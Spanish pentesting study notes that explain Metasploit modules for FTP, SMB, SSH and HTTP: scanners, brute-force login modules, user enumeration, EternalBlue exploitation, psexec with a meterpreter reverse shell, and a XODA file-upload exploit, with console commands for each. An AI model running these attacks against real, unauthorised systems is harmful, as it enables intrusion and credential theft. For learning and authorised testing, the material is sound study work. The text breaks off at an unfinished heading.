- # Modulos:
	- ## FTP:
		- **Modulo para detectar version:**
			- El módulo `ftp_version` de Metasploit es un módulo de escaneo que se utiliza para detectar la versión del servicio FTP que está corriendo en un host objetivo. Este módulo no explota vulnerabilidades, sino que realiza un reconocimiento para identificar el software y la versión específica del servidor FTP, lo cual es un paso crucial en la fase de recolección de información durante una auditoría de seguridad o un pentesting.
	
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `ftp_version`
					- **Tipo de módulo:** Auxiliary / Scanner
					- **Función:** Detectar la versión del servicio FTP en un host objetivo.
	
				- ### Funcionamiento del Módulo
	
					- El módulo `ftp_version` funciona enviando comandos estándar del protocolo FTP al servidor y analizando las respuestas que recibe. Estos comandos permiten que el servidor FTP revele información sobre su software y versión, generalmente en el mensaje de bienvenida (banner) o a través de respuestas a comandos específicos como `SYST` (que devuelve el tipo de sistema operativo).
	
				 - ### Proceso de Escaneo
					
					1. **Establecimiento de Conexión:**
					    - El módulo intenta conectarse al puerto FTP predeterminado (21) en el host objetivo.
					    - Si el puerto está abierto y responde, se envían comandos FTP básicos para interactuar con el servidor.
					2. **Captura de Banner:**
						  	- Al conectar con un servidor FTP, normalmente se recibe un "banner", que es un mensaje de bienvenida del servidor.
					    - Este banner a menudo incluye el nombre del software FTP y su versión, por ejemplo, "220 ProFTPD 1.3.5 Server (Debian)".
					3. **Análisis de Respuestas:**
						- El módulo también puede enviar comandos como `SYST` para obtener información adicional sobre el tipo de sistema operativo del servidor.
					    - Las respuestas recibidas se analizan y se comparan con una base de datos de firmas para identificar el software y la versión exacta.
					4. **Reporte de Resultados:**
						- Una vez que el módulo identifica la versión del servidor FTP, lo reporta en la consola de Metasploit.
					    - Esta información es útil para determinar si el software FTP en cuestión tiene vulnerabilidades conocidas que pueden ser explotadas posteriormente.
	
				- ### Uso del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    En la consola de Metasploit, selecciona el módulo de escaneo `ftp_version`:
					    			    
					    `use auxiliary/scanner/ftp/ftp_version`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias, como la dirección del host objetivo (`RHOSTS`) y el puerto si no es el predeterminado (21):
					    				    				    
					    `set RHOSTS <ip_del_objetivo> set RPORT <puerto_si_no_es_el_por_defecto>`
					    
					3. **Ejecutar el Escaneo:**
					    
					    Ejecuta el módulo para iniciar el escaneo:
					    
					      `run`
					    
					    El módulo intentará conectarse al servidor FTP y determinar la versión del software.
		- **Modulo para atacar loguin:
			- El módulo `ftp_login` de Metasploit es un módulo auxiliar utilizado para realizar ataques de fuerza bruta (brute-force) contra un servidor FTP. Este módulo intenta adivinar las credenciales de inicio de sesión válidas en un servidor FTP utilizando un diccionario de usuarios y contraseñas. Una vez que encuentra credenciales válidas, puede utilizarlas para acceder al servidor FTP.
	
			- ### Descripción del Módulo
	
				- **Nombre del módulo:** `ftp_login`
				- **Tipo de módulo:** Auxiliar (no es un exploit)
				- **Función principal:** Realiza un ataque de fuerza bruta para encontrar credenciales válidas en un servidor FTP.
	
			- ### Funcionamiento del Módulo
	
				1. **Fuerza Bruta de Credenciales:**
				    
				    - El módulo intenta múltiples combinaciones de nombres de usuario y contraseñas para acceder al servidor FTP.
				    - Puedes utilizar diccionarios predefinidos de usuarios y contraseñas o crear los tuyos propios.
				2. **Configuración de Objetivos:**
				    
				    - El módulo puede configurarse para atacar un solo servidor FTP (`RHOSTS`) o múltiples servidores.
				    - Se puede especificar un rango de direcciones IP y puertos si se quiere intentar el ataque contra varios objetivos.
				3. **Manejo de Resultados:**
				    
				    - Si se encuentra una combinación válida de nombre de usuario y contraseña, el módulo reporta las credenciales que funcionaron.
				    - Puedes usar las credenciales encontradas para conectarte al servidor FTP y realizar otras acciones, como descargar o subir archivos.
	
			- ### Ejecución del Módulo en Metasploit
	
				1. **Seleccionar el Módulo:**
				    
				    Primero, selecciona el módulo en Metasploit:
				    	    
				    `use auxiliary/scanner/ftp/ftp_login`
				    
				2. **Configurar las Opciones:**
				    
				    - Configura las opciones necesarias para el ataque. Algunas opciones comunes incluyen:
				    
					    - **`RHOSTS`**: La dirección IP del servidor objetivo (o rango de direcciones IP).
					    - **`RPORT`**: El puerto en el que está escuchando el servicio FTP (por defecto, el puerto es 21).
					    - **`USER_FILE`**: La ruta a un archivo que contiene una lista de nombres de usuario para intentar.
					    - **`PASS_FILE`**: La ruta a un archivo que contiene una lista de contraseñas para intentar.
					    - **`BLANK_PASSWORDS`**: Intentar inicios de sesión con contraseñas en blanco.
					    - **`BRUTEFORCE_SPEED`**: Controla la velocidad del ataque de fuerza bruta.
					    - **`STOP_ON_SUCCESS`**: Detiene el ataque cuando se encuentra una combinación válida.
	- ## SMB:
		- **Escaneo para sacar version de SMB:
			- `SMB_VERSION` es un módulo auxiliar de Metasploit que se utiliza para detectar la versión del protocolo SMB (Server Message Block) que un host está utilizando. Este módulo es útil para recopilar información sobre un servidor SMB, ayudando a identificar posibles vulnerabilidades o configuraciones inseguras asociadas con versiones específicas de SMB.
	
			### Características del Módulo `SMB_VERSION`
			
			1. **Detección de Versión de SMB**:
			    
			    - El módulo intenta determinar la versión de SMB que está siendo utilizada por un servidor. Esto incluye versiones como SMBv1, SMBv2, y SMBv3.
			    - Las versiones de SMB son importantes desde una perspectiva de seguridad, ya que SMBv1, por ejemplo, es conocido por tener varias vulnerabilidades críticas y se recomienda deshabilitarlo en entornos seguros.
			2. **Recopilación de Información Adicional**:
			    
			    - Además de la versión de SMB, el módulo puede proporcionar información sobre el nombre del sistema, el dominio al que pertenece, y otros detalles que pueden ser útiles para el análisis de la red.
			3. **Identificación de Vulnerabilidades**:
			    
			    - Al conocer la versión de SMB utilizada, los analistas de seguridad pueden identificar configuraciones potencialmente vulnerables y aplicar las medidas de mitigación necesarias.
			```
			use auxiliary/scanner/smb/smb_version
			```
		- **Escaneo y analisis de SMBv2:**	
			- El módulo `scanner/smb/smb2` de Metasploit es una herramienta utilizada para identificar y analizar servidores que utilizan el protocolo SMBv2 (Server Message Block versión 2). Este módulo ayuda a los profesionales de seguridad a descubrir detalles importantes sobre los servicios SMB en la red, lo cual es crucial para auditorías de seguridad y pruebas de penetración.
	
			- ### Características del Módulo `scanner/smb/smb2`
				
				1. **Detección de Servidores SMBv2**:
				    
				    - El módulo escanea una red o un rango de direcciones IP para identificar servidores que utilizan SMBv2.
				    - SMBv2 es una mejora del protocolo SMB original y fue introducido con Windows Vista y Windows Server 2008.
				2. **Recopilación de Información**:
				    
				    - Proporciona detalles sobre los servidores que soportan SMBv2, como el nombre del servidor, dominio, y detalles del sistema operativo.
				    - Puede identificar la versión de SMB soportada, ayudando a evaluar la seguridad del servidor.
				3. **Compatibilidad con Versiones Modernas de SMB**:
				    
				    - Aunque el módulo está enfocado en SMBv2, también puede ayudar a identificar servidores que han migrado a SMBv3, ya que algunos servidores pueden soportar ambas versiones.
			```
			use auxiliary/scanner/smb/smb2
			```
		- **Escaneo para enumerar recursos compartidos:
			- El módulo `smb_enumshares` de Metasploit es un escáner que se utiliza para enumerar los recursos compartidos en un servidor SMB (Server Message Block). Este módulo forma parte del **Framework Metasploit**, que es una plataforma para pruebas de penetración y auditoría de seguridad.
	
			- ### Características del Módulo `smb_enumshares`
				
				1. **Enumeración de Recursos Compartidos**:
				    
				    - `smb_enumshares` se enfoca en listar todos los recursos compartidos disponibles en un servidor SMB.
				    - Es útil para identificar qué directorios y archivos están accesibles en un servidor SMB.
				2. **Obtención de Información Adicional**:
				    
				    - Además de los nombres de los recursos compartidos, el módulo puede proporcionar detalles sobre el tipo de acceso (lectura/escritura) y otras propiedades relevantes de los recursos compartidos.
			```
			use auxiliary/scanner/smb/smb_enumshares
			```
		- **Modulo para fuerza bruta sobre el login:**
			- El módulo `smb_login` en Metasploit se utiliza para realizar ataques de fuerza bruta o de autenticación sobre el protocolo SMB (Server Message Block) contra un objetivo específico. Este módulo intenta autenticar en un servidor SMB usando combinaciones de nombres de usuario y contraseñas, lo que puede ser útil para pruebas de penetración en sistemas que ejecutan servicios SMB, como servidores Windows.
			- ### Características del Módulo `smb_login`
	
				1. **Ataque de Fuerza Bruta**:
				    
				    - El módulo puede intentar autenticarse en un servidor SMB utilizando una lista de nombres de usuario y contraseñas, buscando una combinación válida.
				2. **Autenticación por DICCIONARIO**:
				    
				    - Permite usar archivos de diccionario para probar múltiples combinaciones de nombres de usuario y contraseñas.
				3. **Modo Individual**:
				    
				    - También se puede configurar para probar una sola combinación de usuario/contraseña si se tiene una idea específica de las credenciales que se desean probar.
			```
			use auxiliary/scanner/smb/smb_login
			```
		- **Modulo para auditar tuberias de windows:**
			- El módulo `pipe_auditor` de Metasploit es una herramienta diseñada para auditar los nombres de las tuberías (pipes) en sistemas Windows. Las tuberías con nombre (named pipes) son un mecanismo de comunicación entre procesos en Windows que permiten que dos o más procesos se comuniquen entre sí, incluso si no están en la misma máquina.
	
			- ### Características del Módulo `pipe_auditor`
				
				1. **Enumeración de PIPES**:
				    
				    - `pipe_auditor` se utiliza para escanear y enumerar todas las tuberías con nombre disponibles en un sistema Windows objetivo.
				    - Esto es útil porque algunas de estas tuberías pueden estar relacionadas con servicios sensibles o mal configurados, lo que podría permitir a un atacante explotar vulnerabilidades o ganar acceso no autorizado.
				2. **Detección de Tuberías Vulnerables**:
				    
				    - Algunas tuberías con nombre pueden ser explotadas para escalar privilegios o realizar otras actividades maliciosas si no están correctamente aseguradas. El módulo puede ayudar a identificar tales tuberías.
			```
			use auxiliary/scanner/smb/pipe_auditor
			```
		- **Modulo para eternal blue:**
			- El módulo **smb_ms17_010** de Metasploit es un exploit que aprovecha una vulnerabilidad crítica en el protocolo SMBv1 de Windows, conocida como **EternalBlue** (identificada por el CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, y CVE-2017-0147), que fue divulgada en marzo de 2017. Este exploit fue ampliamente utilizado en ciberataques como el ataque de ransomware WannaCry.
				- ### Descripción de la Vulnerabilidad (MS17-010)
	
					- La vulnerabilidad reside en la manera en que el protocolo SMBv1 maneja paquetes especialmente diseñados. Un atacante que logre explotar esta vulnerabilidad puede ejecutar código arbitrario en el sistema de destino, permitiéndole controlar completamente la máquina. Esto incluye la posibilidad de instalar programas, ver, cambiar o borrar datos, o crear nuevas cuentas con todos los derechos de usuario.
				- ### Características del Módulo **smb_ms17_010**
					
					- **Nombre del Módulo**: `exploit/windows/smb/ms17_010_eternalblue`
					- **Plataformas Afectadas**: Windows XP, Windows Vista, Windows 7, Windows 8, Windows Server 2003, Windows Server 2008, y Windows Server 2012.
					- **Tipos de Payload**: Dependiendo de la configuración, puede ejecutar un shell reverso, meterpreter, o cualquier otro payload compatible de Metasploit.
				- ### Cómo Funciona el Módulo
					
					1. **Conexión al Servicio SMB**: El módulo primero se conecta al puerto 445 del objetivo, donde normalmente está corriendo el servicio SMB.
					    
					2. **Comprobación de Vulnerabilidad**: El exploit comprueba si el objetivo es vulnerable, enviando un paquete especialmente diseñado que interactúa con el servicio SMB.
					    
					3. **Exploitación**: Si el objetivo es vulnerable, el módulo envía un paquete especialmente diseñado que provoca un desbordamiento de búfer en el kernel del sistema operativo, permitiendo la ejecución remota de código.
					    
					4. **Carga del Payload**: Una vez explotado, el módulo carga el payload que se ha configurado. Esto puede ser un shell, un meterpreter, o cualquier otro payload configurado.
					    
					5. **Ejecución del Payload**: Finalmente, el payload es ejecutado en el sistema comprometido, lo que le da al atacante acceso al sistema.
				- ### Uso del Módulo en Metasploit
	
					1. **Cargar el Módulo**:
					    				    
					    `use exploit/windows/smb/ms17_010_eternalblue`
					    
					2. **Configurar los Parámetros Necesarios**:
					    
					    - **RHOST**: La dirección IP del objetivo.
					    - **RPORT**: El puerto del servicio SMB (por defecto, 445).
					    - **Payload**: Seleccionar un payload adecuado. Por ejemplo:
					        
					        `set payload windows/x64/meterpreter/reverse_tcp set LHOST <tu_IP> set LPORT <puerto>`
					        
					    - **SMBUser y SMBPass**: Opcionalmente, puedes configurar credenciales si las tienes.
					3. **Verificar la Vulnerabilidad** (opcional):
					    Puedes verificar si el objetivo es vulnerable sin explotarlo:
					    				        
					        `set VERIFY_TARGET true`
					        
					4. **Ejecutar el Exploit**:
					    			    
					    `exploit`
					    
					    Esto intentará explotar la vulnerabilidad y ejecutar el payload en el objetivo.
		- **Modulo para enumerar usuarios:
			- El módulo `smb_enumusers` de Metasploit es un módulo auxiliar diseñado para enumerar los usuarios de un sistema Windows a través del servicio SMB (Server Message Block). Este tipo de enumeración es muy útil en pruebas de penetración, ya que permite a un atacante obtener una lista de usuarios válidos en el sistema objetivo, lo que puede facilitar posteriores ataques, como fuerza bruta para adivinar contraseñas o explotación de otras vulnerabilidades.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `smb_enumusers`
					- **Tipo de módulo:** Auxiliar (no es un exploit)
					- **Función principal:** Enumerar los usuarios de un sistema Windows utilizando SMB.
					- **Protocolo:** SMB (usualmente a través del puerto 445 o 139)
				- ### Funcionamiento del Módulo
					
					1. **Conexión al Servicio SMB:**
					    
					    - El módulo se conecta al servicio SMB del sistema objetivo. SMB es un protocolo de red utilizado para compartir archivos, impresoras y otros recursos entre computadoras.
					2. **Enumeración de Usuarios:**
					    
					    - Una vez conectado, el módulo intenta obtener una lista de usuarios del sistema objetivo.
					    - Dependiendo de la configuración de seguridad del sistema, puede que se requieran credenciales válidas para obtener la lista completa de usuarios, o puede que el módulo logre extraer información sin necesidad de autenticación (especialmente en sistemas mal configurados o más antiguos).
					3. **Salida de Resultados:**
					    
					    - El módulo devuelve una lista de usuarios, que puede incluir nombres de usuarios locales y de dominio si el sistema forma parte de un dominio de Active Directory.
					    - Esta información puede ser utilizada para realizar ataques posteriores, como fuerza bruta de contraseñas o ataques dirigidos contra cuentas específicas.
				- ### Ejecución del Módulo en Metasploit
					
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					      
					    `use auxiliary/scanner/smb/smb_enumusers`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para el ataque. Algunas opciones comunes incluyen:
					    
					    - **`RHOSTS`**: La dirección IP del servidor objetivo o un rango de direcciones IP.
					    - **`RPORT`**: El puerto en el que está escuchando el servicio SMB (por defecto, el puerto es 445).
					    - **`SMBUser` y `SMBPass`**: Opcionalmente, puedes proporcionar credenciales de usuario SMB si el sistema requiere autenticación para enumerar usuarios.
					    
					    Ejemplo:
					    		    
					    `set RHOSTS 192.168.1.10`
					    
					3. **Ejecutar el Módulo:**
					    
					    Una vez que todas las opciones están configuradas, ejecuta el módulo:
					    
					      `run`
					    
					    El módulo intentará conectarse al sistema SMB y enumerar los usuarios.
		-  **Modulo para utilizar PSEXEC SMB
			- El módulo **`psexec`** en Metasploit es una herramienta popular para explotar el protocolo **SMB (Server Message Block)** en sistemas Windows. Utiliza las credenciales de usuario para ejecutar comandos en un sistema remoto mediante **SMB** y **DCOM (Distributed Component Object Model)**. Es particularmente útil en entornos de pentesting y red teaming cuando se tienen credenciales válidas de administrador y se desea ejecutar comandos de manera remota en equipos de la red.
			- ### Cómo Funciona `psexec`

				- Este módulo aprovecha la funcionalidad de administración remota de Windows, similar a la del programa `PsExec` de Sysinternals, para ejecutar comandos en un equipo remoto sin requerir una vulnerabilidad específica en el sistema. Utiliza las credenciales de administrador para conectarse al servicio SMB y ejecutar un payload en el equipo remoto.
			- ### Detalles y Opciones del Módulo
				
				- **Módulo**: `exploit/windows/smb/psexec`
				- **Nombre**: SMB Admin Shell (psexec)
			- ### Opciones Principales
				
				1. **RHOSTS**: Especifica la dirección IP o el rango de IPs del objetivo.
				2. **SMBUser** y **SMBPass**: Las credenciales de usuario y contraseña de un usuario con permisos administrativos en el sistema de destino.
				3. **SMBDomain**: El dominio al que pertenece el sistema de destino. Si es un equipo en grupo de trabajo, puedes dejarlo vacío.
				4. **PAYLOAD**: El payload que deseas ejecutar. Por defecto, suele utilizarse `windows/meterpreter/reverse_tcp`, pero se puede cambiar a otro payload según el objetivo.
				5. **LHOST** y **LPORT**: Dirección IP y puerto local donde Metasploit espera la conexión inversa del payload.
				6. **RPORT**: El puerto del servicio SMB en el equipo de destino, normalmente el puerto 445.
				7. **SERVICE_START_NAME** y **SERVICE_START_PASS**: Opcionalmente, puedes especificar otra cuenta de servicio si el sistema de destino lo requiere para ejecutar el servicio remoto.
			- ### Ejemplo de Configuración

				- Un ejemplo básico para ejecutar este módulo es:
					```
						use exploit/windows/smb/psexec 
						set RHOSTS 192.168.1.10
						set SMBUser administrador
						set SMBPass contraseña123
						set PAYLOAD windows/meterpreter/reverse_tcp
						set LHOST 192.168.1.5 set LPORT 4444 run
					```

				- En este ejemplo:

					- El módulo se conecta a **192.168.1.10** usando la cuenta de administrador.
					- Ejecuta un **payload de Meterpreter** que se conecta de vuelta a la máquina atacante en **192.168.1.5** en el puerto **4444**.

			- ### Requisitos y Consideraciones
				
				- **Credenciales Administrativas**: Es necesario tener credenciales válidas con permisos de administrador en el sistema de destino. Sin esto, el ataque no tendrá éxito.
				- **Antivirus y EDR**: Este método es detectado con frecuencia por software de seguridad como antivirus y EDR (Endpoint Detection and Response). En entornos protegidos, es posible que se necesiten técnicas de evasión adicionales.
				- **Firewall**: El puerto 445 debe estar accesible desde la máquina atacante. Si hay un firewall bloqueando este puerto, el ataque fallará.

			- ### Mecanismo de Ejecución
				
				1. **Conexión a SMB**: El módulo `psexec` se conecta al servicio SMB del sistema de destino.
				2. **Carga de Payload**: Utiliza el servicio SMB para copiar el payload o ejecutable en el equipo de destino.
				3. **Ejecución del Payload**: Crea un servicio temporal en el sistema de destino para ejecutar el payload. Este servicio suele eliminarse después de la ejecución.
				4. **Establecimiento de Sesión**: Una vez ejecutado, el payload, como `Meterpreter`, establece una sesión de comunicación inversa con el equipo atacante, permitiendo acceso remoto.
	- ## SSH:
		- **Escaneo de fuerza bruta en el loguin:
			- El módulo `auxiliary/scanner/ssh/ssh_login` en Metasploit es una herramienta que se utiliza para realizar un ataque de fuerza bruta contra el servicio SSH de un servidor. Su objetivo es intentar adivinar las credenciales (combinaciones de nombre de usuario y contraseña) necesarias para iniciar sesión en el servidor mediante SSH.
			### Características del Módulo `ssh_login`
			- **Ataque de Fuerza Bruta**: El módulo `ssh_login` intenta múltiples combinaciones de nombres de usuario y contraseñas para tratar de obtener acceso a un servidor SSH. Puede utilizar tanto listas predefinidas de credenciales como listas personalizadas que el usuario proporcione.
		    - **Conexión a Múltiples Objetivos**: Este módulo puede escanear múltiples direcciones IP o rangos de IP para encontrar servidores SSH y probar credenciales en todos ellos.
		    - **Soporte para Claves Públicas**: Además de las contraseñas, el módulo también puede intentar autenticarse utilizando claves públicas SSH si se proporciona una.
		    - **Soporte para Directorio de Hosts y Nombres de Usuario**: Permite la carga de archivos que contienen una lista de direcciones IP (o nombres de host) y nombres de usuario para realizar el ataque.
			```
		    use auxiliary/scanner/ssh/ssh_login
			```
		- **Modulo para enumerar usuarios:**
			- El módulo `ssh_enumusers` de Metasploit es un módulo auxiliar utilizado para enumerar nombres de usuario válidos en un servidor SSH. Este tipo de ataque se conoce como "username enumeration" y explota la diferencia en las respuestas del servidor SSH cuando se prueba un nombre de usuario válido frente a uno inválido.
	
			- ### Descripción del Módulo
				
				- **Nombre del módulo:** `ssh_enumusers`
				- **Tipo de módulo:** Auxiliar (no es un exploit)
				- **Función principal:** Enumerar nombres de usuario válidos en un servidor SSH.
	
			- ### Funcionamiento del Módulo
	
				- El módulo `ssh_enumusers` intenta identificar nombres de usuario válidos en un servidor SSH utilizando diversas técnicas basadas en la respuesta del servidor a intentos de conexión.
	
			- ### Métodos de Enumeración
				
				1. **Timing Attack:**
				    
				    - Algunos servidores SSH responden con un retraso diferente cuando se intenta autenticar con un nombre de usuario inexistente versus uno existente. Este módulo mide el tiempo de respuesta del servidor para determinar si un nombre de usuario es válido.
				2. **Error Message Differences:**
				    
				    - En algunos casos, el mensaje de error devuelto por el servidor puede ser ligeramente diferente si el nombre de usuario existe, lo que permite deducir la existencia de dicho usuario.
	
			- ### Ejecución del Módulo en Metasploit
	
				- **Paso 1: Seleccionar el Módulo**
					
					Primero, selecciona el módulo en la consola de Metasploit:
					
					bash
					
					Copiar código
					
					`use auxiliary/scanner/ssh/ssh_enumusers`
	
				- **Paso 2: Configurar las Opciones**
					
					Configura las opciones necesarias para la enumeración. Aquí tienes algunas de las opciones clave:
					
					- **`RHOSTS`**: La dirección IP o el rango de direcciones IP del servidor o servidores SSH objetivo.
					- **`RPORT`**: El puerto en el que está escuchando el servicio SSH (por defecto, el puerto es 22).
					- **`USER_FILE`**: La ruta a un archivo que contiene una lista de nombres de usuario que deseas probar.
	
						Ejemplo:
						
						`set RHOSTS 192.168.1.10 set USER_FILE /path/to/usernames.txt`
	
				- **Paso 3: Ejecutar el Módulo**
	
					Una vez que has configurado las opciones, ejecuta el módulo:
					
					`run`
					
					El módulo comenzará a probar los nombres de usuario especificados en el archivo de usuario contra el servidor SSH objetivo.
	
				- **Paso 4: Interpretar los Resultados**
	
					El módulo te proporcionará una lista de nombres de usuario que son válidos en el servidor objetivo. Podrías ver algo como:
					
					`[*] 192.168.1.10:22 - Valid User: admin [*] 192.168.1.10:22 - Valid User: guest`
					
					Esto indica que los usuarios `admin` y `guest` son válidos en el servidor SSH.
		- **Modulo para sacar version:**
			- El módulo `ssh_version` de Metasploit es un módulo auxiliar que se utiliza para recopilar información sobre el software SSH (Secure Shell) que está en ejecución en un servidor remoto. Específicamente, este módulo intenta identificar la versión del servidor SSH, lo que puede ser útil en un contexto de pruebas de penetración para descubrir posibles vulnerabilidades asociadas con versiones específicas de software SSH.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `ssh_version`
					- **Tipo de módulo:** Auxiliar (scanner)
					- **Función principal:** Identificar la versión del servidor SSH en un host remoto.
				- ### Funcionamiento del Módulo
					
					1. **Conexión al Servidor SSH:**
					    
					    - El módulo intenta conectarse al puerto donde está escuchando el servidor SSH, normalmente el puerto 22, pero puede configurarse para otro puerto si es necesario.
					2. **Recopilación del Banner SSH:**
					    
					    - Cuando un cliente se conecta a un servidor SSH, el servidor generalmente envía un "banner", que es un mensaje de bienvenida que incluye información sobre la versión del software SSH que está utilizando.
					    - Este banner típicamente contiene el nombre del software (por ejemplo, `OpenSSH`) y la versión específica (por ejemplo, `OpenSSH_7.4`).
					3. **Análisis del Banner:**
					    
					    - El módulo analiza el banner recibido para extraer y reportar la versión del software SSH en uso.
					    - A veces, este banner también puede incluir el sistema operativo o la versión del sistema en el que está corriendo el servidor SSH.
					4. **Reporte de la Versión:**
					    
					    - La versión del servidor SSH identificada se muestra en la consola de Metasploit, proporcionando al usuario detalles que pueden ayudar en la siguiente fase de pruebas, como la búsqueda de vulnerabilidades específicas para esa versión.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					    
						`use auxiliary/scanner/ssh/ssh_version`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para ejecutar el escaneo. Algunas opciones comunes incluyen:
					    
					    - **`RHOSTS`**: La dirección IP del host remoto o un rango de direcciones IP.
					    - **`RPORT`**: El puerto en el que está escuchando el servicio SSH (por defecto es 22).
					    
					    Ejemplo:
					    			    
					    `set RHOSTS 192.168.1.10 set RPORT 22`
					    
					3. **Ejecutar el Módulo:**
					    
					    Después de configurar las opciones, ejecuta el módulo:
					    				    
					    `run`
					    
					    El módulo intentará conectarse al servidor SSH en la dirección IP y puerto especificados, y luego mostrará el banner del servidor SSH, indicando la versión del software SSH en ejecución.
					    
					4. **Revisar los Resultados:**
					    
					    Una vez ejecutado, la salida del módulo podría verse algo así:
					    				    
					    `[*] 192.168.1.10:22, SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u4`
					    
					    En este ejemplo, el servidor SSH está ejecutando `OpenSSH` versión `7.4p1` en un sistema `Debian`.
	- ## HTTP:
		- **Escaneo de version:**
			- El módulo `http_version` en Metasploit es un escáner diseñado para identificar y obtener información sobre las versiones de servidores HTTP que están en ejecución en los hosts objetivo. Este módulo envía una solicitud HTTP simple y analiza la respuesta del servidor para extraer la versión del servidor HTTP.
				- ### Funcionamiento del Módulo `http_version`
	
					- El módulo realiza una solicitud HTTP, generalmente una solicitud GET, a un servidor web en el puerto 80 (o en cualquier otro puerto especificado). La respuesta del servidor normalmente incluye un encabezado `Server`, que contiene información sobre el software del servidor web y su versión.
				```
				use auxiliary/scanner/http/http_version
				```
		- **Fuerza brupata para ver directorios:**
			- El módulo `http/brute_dirs` de Metasploit es un auxiliar utilizado para realizar un ataque de fuerza bruta en busca de directorios web y archivos en un servidor web objetivo. Este tipo de ataque intenta adivinar los nombres de directorios o archivos existentes en el servidor al hacer múltiples solicitudes HTTP.
			- ### Propósito del módulo
	
				- El objetivo de este módulo es descubrir recursos web ocultos o que no están vinculados directamente desde las páginas web accesibles. Estos recursos pueden incluir directorios de administración, archivos de respaldo, directorios de configuración, o cualquier otro tipo de información que podría ser útil para un atacante o un auditor de seguridad.
	
			- ### Funcionamiento del módulo
	
				- El módulo funciona realizando múltiples solicitudes HTTP a un servidor web, probando diferentes combinaciones de directorios y archivos basados en una lista predefinida (o personalizada) de nombres. Si el servidor responde con un código HTTP que indica la existencia del recurso (como un `200 OK`), el módulo registra el descubrimiento.
				```
				use auxiliary/scanner/http/brute_dirs
				set RHOSTS 192.168.1.100
				set RPORT 80
				set SSL false
				set PATH /
				set WORDLIST /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
				set VERBOSE true
				```
		- **Script para detectar robot.txt:**
			- El módulo `robot_txt` de Metasploit está diseñado para interactuar con el archivo `robots.txt` de un servidor web. Este archivo es utilizado por los administradores de sitios web para indicar a los motores de búsqueda qué partes del sitio web deben o no deben ser indexadas. Sin embargo, este archivo puede contener información valiosa para un atacante, como rutas a directorios sensibles o páginas que el administrador no quiere que sean accesibles públicamente.
			
			- ### Funcionalidad del Módulo `robot_txt`
			1. **Descarga el archivo `robots.txt`:** El módulo se conecta al servidor web de destino y descarga el archivo `robots.txt` desde la raíz del sitio web (es decir, accediendo a `http://<objetivo>/robots.txt`).
			2. **Analiza el contenido:** Una vez descargado, el módulo analiza las directivas contenidas en el archivo. Estas directivas pueden incluir líneas con "Disallow", que indican a los motores de búsqueda qué partes del sitio no deben ser indexadas.
			3. **Lista de URLs potencialmente interesantes:** El módulo identifica y enumera las URLs o rutas que están siendo excluidas, ya que estas pueden ser de interés para un atacante. A menudo, estas rutas pueden contener recursos que los administradores no desean que sean descubiertos, como paneles de administración, archivos de configuración, o datos privados.
			```
			use auxiliary/scanner/http/robot_txt
			```
		- **Modulo para detectar carga de archivos:**
			- El módulo `xoda_file_upload` de Metasploit explota una vulnerabilidad en XODA, un sistema de gestión de archivos basado en web. XODA es utilizado para administrar archivos y directorios en servidores web, permitiendo operaciones como cargar, eliminar y mover archivos.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `xoda_file_upload`
					- **Vulnerabilidad explotada:** File Upload Vulnerability (Vulnerabilidad de carga de archivos)
					- **CVE:** Puede estar asociado a una vulnerabilidad específica según la versión de XODA afectada.
				
				- ### Funcionamiento de la Vulnerabilidad
				
					- La vulnerabilidad de carga de archivos en XODA permite a un atacante subir archivos maliciosos al servidor sin la validación adecuada. Esto incluye la capacidad de subir scripts maliciosos (como `PHP`) que pueden ser ejecutados por el servidor web, permitiendo al atacante ejecutar comandos arbitrarios en el sistema.
				
				* ### Cómo Funciona el Módulo
					
					1. **Explotación de la Vulnerabilidad:**
					    
					    - El módulo aprovecha la falta de validación en el proceso de carga de archivos en XODA.
					    - El atacante utiliza el módulo para subir un archivo malicioso (normalmente una _web shell_ en PHP) al servidor vulnerable.
					    - Una vez que el archivo se ha subido, el atacante puede ejecutar comandos en el servidor a través del archivo malicioso.
					2. **Requerimientos:**
					    
					    - El atacante necesita saber la ruta de la URL de carga de archivos en el servidor XODA.
					    - Debe tener acceso al panel de XODA donde se realiza la carga de archivos.
					3. **Impacto:**
					    
					    - Una vez que el archivo malicioso está en el servidor, el atacante puede tener acceso completo al sistema dependiendo de los permisos del servidor web.
					    - Esto podría permitir la toma de control total del servidor, el acceso a datos sensibles, y la posibilidad de pivotar a otras partes de la red.
				- ### Ejecución del Módulo en Metasploit
								
					1. **Seleccionar el Módulo:**
					    
					    `use exploit/unix/webapp/xoda_file_upload`
					    
					2. **Configurar las Opciones:**
					    
					    - Configura las opciones necesarias, como la dirección de destino (`RHOSTS`) y el puerto (`RPORT`). También puedes especificar el payload que deseas utilizar:
					    
					       `set RHOSTS <ip_del_servidor_vulnerable> set RPORT <puerto_si_no_es_el_por_defecto> set TARGETURI <ruta_de_xoda>`
					    
					3. **Ejecutar el Módulo:**
					    Esto intentará subir el archivo malicioso y ejecutarlo en el servidor.
					       `run`
		- **Script para enumerar directorios con permiso de escritura:**
			- El módulo `mysql_writable_dirs` de Metasploit está diseñado para identificar directorios dentro de un servidor MySQL que tienen permisos de escritura. Este módulo es útil para los testers de seguridad y administradores de sistemas para encontrar posibles vulnerabilidades en la configuración de permisos del servidor MySQL.
				- ### Funcionalidad del Módulo `mysql_writable_dirs`
					
					1. **Exploración de Directorios**: El módulo examina los directorios en el sistema de archivos del servidor MySQL que pueden tener permisos de escritura para el usuario bajo el cual se está ejecutando el servidor MySQL.
					2. **Enumeración de Directorios**: Busca directorios específicos que podrían ser vulnerables a la escritura, lo que podría permitir la carga de archivos maliciosos o la explotación de configuraciones incorrectas.
				```
				use auxiliary/scanner/mysql/mysql_writable_dirs
				```
		- **Modulo fuerza brupata contra login:
